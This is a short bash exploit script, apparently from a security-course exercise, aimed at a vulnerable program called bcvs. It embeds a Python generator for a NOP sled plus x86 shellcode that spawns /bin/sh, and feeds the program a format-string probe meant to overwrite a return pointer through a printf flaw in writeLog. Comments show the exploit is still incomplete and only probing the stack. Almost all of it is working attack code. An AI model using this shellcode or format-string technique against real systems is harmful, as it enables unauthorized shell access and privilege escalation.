#!/bin/bash

## ---------------------- Description ------------------------ ##
## This sploit inserts shellcode into the log buffer in
## main and then uses the printf vulnerability in writeLog
## to overwite the return pointer to go to this code.
## ----------------------------------------------------------- ##

## Note: Since this exploit and sploit1 don't depend on faking the block.list
## they should be removed eventually. This is just to allow us to execute them
## from the repo
rm -rf sploit2_dir
mkdir -p sploit2_dir
cd sploit2_dir
mkdir -p .bcvs
touch .bcvs/block.list

# ------------------- Create Scripts ------------------- #
cat <<EOS > "payload.py"
#!/usr/bin/python

import sys

bsize = 240
NOP="\x90"

shellcode = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
shellcode += "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
shellcode += "\x80\xe8\xdc\xff\xff\xff/bin/sh"


if __name__ == '__main__':
  if len(sys.argv) > 1:
    bsize = int(sys.argv[1])

  if bsize < len(shellcode):
    print("Your buffer size should be at least as long as the shellcode: {}".format(len(shellcode)))
    sys.exit(-1)

  full_shellcode = NOP * (bsize - len(shellcode) - 1)
  full_shellcode += shellcode
  print(full_shellcode)
  sys.exit(0)
EOS

chmod +x payload.py
SHELLCODE=`./payload.py`

if [[ $? == -1 ]]; then
  echo "failed to generate shellcode"
fi
echo "Created shellcode of length: ${#SHELLCODE}"

## For now I am just having it print some junk to see what is on the stack
## This should help us with the format string vulnerability
echo "%x_%x_%x_%x_%x_%x_%x_%x_%x_%x" | /opt/bcvs/bcvs ci "$SHELLCODE"

echo -e "\nHere's what i've found out so far:"
echo -e "\t* 5th - 'tempString' from writeLog's stack"
echo -e "\t* 6th - 'c' form writeLog's stack"
echo -e "\t* 7th - 'i' from writeLog's stack"
